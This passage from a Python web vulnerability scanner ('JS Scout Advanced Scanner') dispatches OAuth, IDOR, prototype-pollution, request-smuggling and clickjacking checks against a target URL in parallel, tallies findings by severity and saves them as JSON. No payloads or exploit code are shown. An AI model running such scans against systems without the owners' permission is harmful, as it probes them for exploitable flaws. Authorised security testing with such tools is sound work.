            "oauth":           lambda: OAuthScanner(self.session, self.timeout, self.log).scan(url),
            "idor":            lambda: IDORScanner(self.session, self.timeout, self.log).scan(url, all_params),
            "proto_pollution": lambda: ProtoPollutionScanner(self.session, self.timeout, self.log).scan(url),
            "smuggling":       lambda: SmuggleProber(self.session, self.timeout, self.log).scan(url),
            "clickjack":       lambda: ClickjackScanner(self.session, self.timeout, self.log).scan(url),
        }

        def run_task(cat, fn):
            try:
                results = fn()
                with self._lock:
                    self.findings[cat] = results or []
                    for f in (results or []):
                        sev = f.get("severity", "INFO")
                        icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡",
                                "LOW": "🔵", "INFO": "⚪"}.get(sev, "⚪")
                        self.log(
                            f"  {icon} [{sev}] [{cat.upper()}] {f['type']} — "
                            f"{f['description'][:80]}"
                        )
            except Exception as e:
                self.log(f"  [!] {cat} check error: {e}")

        with ThreadPoolExecutor(max_workers=min(self.threads, len(tasks))) as pool:
            futs = {}
            for cat, fn in tasks.items():
                tout = self.CATEGORY_TIMEOUT.get(cat, 60)
                futs[pool.submit(run_task, cat, fn)] = (cat, tout)

            done, pending = _cf.wait(
                futs.keys(), timeout=max(self.CATEGORY_TIMEOUT.values()) + 10
            )
            for fut in pending:
                fut.cancel()

        return self.findings

    def summary(self) -> dict:
        total = sum(len(v) for v in self.findings.values())
        by_sev = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for f_list in self.findings.values():
            for f in f_list:
                sev = f.get("severity", "INFO")
                by_sev[sev] = by_sev.get(sev, 0) + 1

        return {
            "total":        total,
            "by_severity":  by_sev,
            "by_category":  {cat: len(v) for cat, v in self.findings.items()},
            "findings":     self.findings,
        }


# ─────────────────────────────────────────────────────────────────────────────
# STANDALONE CLI
# ─────────────────────────────────────────────────────────────────────────────

def main():
    import argparse
    ap = argparse.ArgumentParser(description="JS Scout Advanced Scanner — standalone mode")
    ap.add_argument("target", help="Target URL")
    ap.add_argument("--threads", type=int, default=10)
    ap.add_argument("--timeout", type=int, default=10)
    ap.add_argument("--output", default="advanced_output")
    args = ap.parse_args()

    scanner = AdvancedScanner(args.target, threads=args.threads, timeout=args.timeout)
    print(f"\n[*] JS Scout Advanced Scanner — target: {args.target}\n")

    findings = scanner.run()
    summary  = scanner.summary()

    out = Path(args.output)
    out.mkdir(parents=True, exist_ok=True)
    (out / "advanced_findings.json").write_text(
        json.dumps(findings, indent=2, default=str), encoding="utf-8"
    )

    print(f"\n[✓] Done. Total: {summary['total']} findings")
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        n = summary["by_severity"].get(sev, 0)
        if n:
            print(f"    {sev:<10}: {n}")
    print(f"\n    Results: {out / 'advanced_findings.json'}")


if __name__ == "__main__":
    main()
